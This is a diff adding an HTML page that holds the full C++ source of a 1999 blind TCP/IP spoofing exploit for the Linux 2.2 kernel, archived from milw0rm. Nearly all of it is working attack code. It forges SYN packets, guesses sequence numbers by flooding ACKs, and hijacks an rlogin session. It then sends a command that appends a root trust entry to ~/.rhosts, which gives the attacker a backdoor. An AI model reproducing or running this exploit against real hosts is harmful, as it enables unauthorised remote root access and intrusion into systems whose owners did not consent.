@@ -1,0 +1,219 @@
+<html>
+<head>
+<title>Linux Kernel 2.2 (TCP/IP Weakness) Exploit</title>
+<pre>
+/**
+*** Exploit for the 2.2 linux-kernel TCP/IP weakness. 
+*** (C) 1999 by S. Krahmer. 
+*** THERE IS ABSOLUTELY NO WARRANTY. YOU USE IT AT YOUR OWN RSIK!
+*** THIS PROGRAM IS LICESED UNDER THE GPL and belongs to a security-
+*** advisory of team teso. You should get the full advisory with paper
+*** on either 
+*** http://www.cs.uni-potsdam.de/homepages/students/linuxer or
+*** http://teso.scene.at
+***
+*** The bugdiscovery and the exploit is due to:
+***
+*** Stealth	http://www.kalug.lug.net/stealth
+*** S. Krahmer http://www.cs.uni-potsdam.de/homepages/students/linxuer
+***
+*** c++ blindSpoof.cc -lusi++ -lpcap	(this is LINUX source!)
+*** Libusi++ is available on my homepage.
+*** Achtung: Gehen Sie nicht in den 100 Meilen tiefen Wald! ;-)
+**/
+
+#include &lt;stdio.h&gt;
+#include &lt;iostream&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;usi++/usi++.h&gt;
+
+#define XPORT 513
+
+// may be changed, my best results were around 2000,
+// but also diffs of &gt; 5000 can happen :)
+// change it it really not works
+#define MAXPACK 3000
+
+// define this if you want to exploit rlogind
+// if not, you will just spoof a connection to XPORT
+#define EXPLOIT_RLOGIND 
+
+// uses eth0 for packet-capturing!
+TCP *pingVictum(char *, char *, char *);
+int printInfo(TCP *);
+bool wrongPacket(TCP *, TCP *);
+
+int main(int argc, char **argv)
+{
+	// yes, script-kidz! this is hardcoded to prevent you from usage.
+	const char *remoteUser = &quot;stealth&quot;,
+	           *localUser  = &quot;stealth&quot;,
+		   *command    = &quot;echo liane root&gt;&gt;~/.rhosts\n&quot;;
+	char sbuf[1000];
+	
+	if (argc &lt; 4) {
+		printf(&quot;Usage %s [destination-IP] [source-IP] [spoofed-IP]\n&quot;, argv[0]);
+		exit(1);
+	}
+	cout&lt;&lt;&quot;blindSpoof-exploit by S. Krahmer\n&quot;
+	      &quot;http://www.cs.uni-potsdam.de/homepages/students/linuxer\n\n&quot;;	
+	// would be connect() 
+       	TCP *conn = pingVictum(argv[1], argv[2], argv[3]);
+
+#ifdef EXPLOIT_RLOGIND
+	conn-&gt;set_flags(0);
+	sprintf(sbuf, &quot;\0&quot;);
+	conn-&gt;sendpack(sbuf, 1);
+	sleep(1);
+	
+	cout&lt;&lt;&quot;Sending local username: &quot;&lt;&lt;localUser&lt;&lt;endl;
+	
+	// send local username
+	conn-&gt;set_seq(conn-&gt;get_seq() + 1);
+	memset(sbuf, 0, 1000);
+	snprintf(sbuf, sizeof(sbuf), &quot;%s\0&quot;, localUser);
+	conn-&gt;sendpack(sbuf, strlen(sbuf) + 1);
+	
+	// we don't know about the lag, so i hope that 7 in sec.
+	// the victum has sent an ACK
+	sleep(7);
+	
+	cout&lt;&lt;&quot;Sending remote username: &quot;&lt;&lt;remoteUser&lt;&lt;endl;
+	
+	// send remote username
+	conn-&gt;set_seq(conn-&gt;get_seq() + strlen(sbuf) + 1);
+	memset(sbuf, 0, sizeof(sbuf));
+	snprintf(sbuf, sizeof(sbuf), &quot;%s\0&quot;, remoteUser);
+	conn-&gt;sendpack(sbuf, strlen(sbuf) + 1);
+	sleep(7);
+	
+	cout&lt;&lt;&quot;Sending terminal-type and speed.\n&quot;;
+	conn-&gt;set_seq(conn-&gt;get_seq() + strlen(sbuf) + 1);
+	memset(sbuf, 0, sizeof(sbuf));
+	snprintf(sbuf, sizeof(sbuf), &quot;%s\0&quot;, &quot;linux/38400&quot;);
+	conn-&gt;sendpack(sbuf, strlen(sbuf) + 1);
+	sleep(7);
+	
+	
+	cout&lt;&lt;&quot;Sending command: &quot;&lt;&lt;command&lt;&lt;endl;
+	conn-&gt;set_seq(conn-&gt;get_seq() + strlen(sbuf) + 1);
+	memset(sbuf, 0, sizeof(sbuf));
+	snprintf(sbuf, sizeof(sbuf), &quot;%s\0&quot;, command);
+	conn-&gt;sendpack(sbuf, strlen(sbuf) + 1);
+#else
+	cout&lt;&lt;&quot;Connection to port &quot;&lt;&lt;XPORT&lt;&lt;&quot; should be established.\n&quot;;
+#endif
+	delete conn;
+	return 0;
+}
+
+/* Spoof a connection. */
+TCP *pingVictum(char *host, char *src, char *spoofed)
+{
+	char buf[100];
+        TCP *victumLow = new TCP(host),
+	    *victumSpoofed = new TCP(host),
+	    *sn = new TCP(host);    
+        int myISN = rand(), sport = 512 + rand()%512;
+        
+        sn-&gt;init_device(&quot;eth0&quot;, 1, 500);
+
+        victumLow-&gt;set_flags(TH_SYN);
+     	victumLow-&gt;set_dstport(XPORT);	// rlogin
+        victumLow-&gt;set_srcport(sport);	// from a privileged port
+        victumLow-&gt;set_src(src);                
+    	victumLow-&gt;set_seq(myISN);
+		
+        victumSpoofed-&gt;set_flags(TH_SYN);
+     	victumSpoofed-&gt;set_dstport(XPORT);	
+        victumSpoofed-&gt;set_srcport(sport);	
+        victumSpoofed-&gt;set_src(spoofed);
+	victumSpoofed-&gt;set_seq(myISN);		// we must save the ISN
+	
+	// send SYN to get low end of ISN
+	victumLow-&gt;sendpack(&quot;&quot;);
+		
+	// send spoofed SYN 
+        victumSpoofed-&gt;sendpack(&quot;&quot;);
+	
+	cout&lt;&lt;&quot;Using sourceport &quot;&lt;&lt;victumSpoofed-&gt;get_srcport()&lt;&lt;endl;
+	
+	// wait for SYN/ACK of low packet
+	while (wrongPacket(sn, victumLow)) {
+           	sn-&gt;sniffpack(buf, 100);
+                printf(&quot;%s:%d -&gt; %s:%d &quot;, sn-&gt;get_src(1), sn-&gt;get_srcport(),
+		                          sn-&gt;get_dst(1), sn-&gt;get_dstport());
+                printInfo(sn);
+        }
+	int lowISN = sn-&gt;get_seq();		
+	sleep(2);
+	
+	// NOTE! Even if we sent the SYN before the spoofed SYN, the
+	// spoofed SYN can arrive first, due to routing reasons.
+	// Althought this is NOT very likely, we have to keep it in mind.
+	cout&lt;&lt;&quot;Low end: &quot;&lt;&lt;(unsigned)lowISN&lt;&lt;&quot;\n&quot;;	
+        victumSpoofed-&gt;set_flags(TH_ACK);
+    	victumSpoofed-&gt;set_seq(myISN + 1);
+
+	// 	
+        for (int i = lowISN; i &lt; lowISN + MAXPACK; i++) {
+                victumSpoofed-&gt;set_ack(i);
+                victumSpoofed-&gt;sendpack(&quot;&quot;);
+		printf(&quot;%u\r&quot;, i); fflush(stdout);
+		// maybe you have to place a usleep() here, depends on
+		// your devices
+        }
+	cout&lt;&lt;endl;
+	delete sn;
+        delete victumLow;
+	
+	// from now, the connection should be established!
+	return victumSpoofed;
+}
+
+
+// give out some infos about the received packet
+int printInfo(TCP* r)
+{
+	cout&lt;&lt;&quot;[flags: &quot;;
+	if (r-&gt;get_flags() &amp; TH_FIN)
+		cout&lt;&lt;&quot;FIN &quot;;
+	if (r-&gt;get_flags() &amp; TH_SYN)
+		cout&lt;&lt;&quot;SYN &quot;;
+	if (r-&gt;get_flags() &amp; TH_RST)
+		cout&lt;&lt;&quot;RST &quot;;
+	if (r-&gt;get_flags() &amp; TH_PUSH)
+		cout&lt;&lt;&quot;PUSH &quot;;
+	if (r-&gt;get_flags() &amp; TH_ACK)
+		cout&lt;&lt;&quot;ACK &quot;;
+	if (r-&gt;get_flags() &amp; TH_URG)
+		cout&lt;&lt;&quot;URG &quot;;
+	cout&lt;&lt;&quot;] [ACK: &quot;&lt;&lt;r-&gt;get_ack()&lt;&lt;&quot;] [SEQ: &quot;&lt;&lt;r-&gt;get_seq()&lt;&lt;&quot;]&quot;&lt;&lt;endl;
+	return 0;
+}
+
+/* returns true is packet is WRONG
+ */
+bool wrongPacket(TCP *p1, TCP *p2)
+{
+   	if (p1-&gt;get_src() != p2-&gt;get_dst())
+           	return true;
+        if (p1-&gt;get_dst() != p2-&gt;get_src())
+           	return true;
+        if (p1-&gt;get_dstport() != p2-&gt;get_srcport())
+           	return true;
+        if (p1-&gt;get_srcport() != p2-&gt;get_dstport())
+           	return true;
+        if (p1-&gt;get_ack() != (p2-&gt;get_seq() + 1))
+           	return true;
+        return false;
+}
+
+
+// milw0rm.com [2001-01-02]
+</pre>
+</html>
+
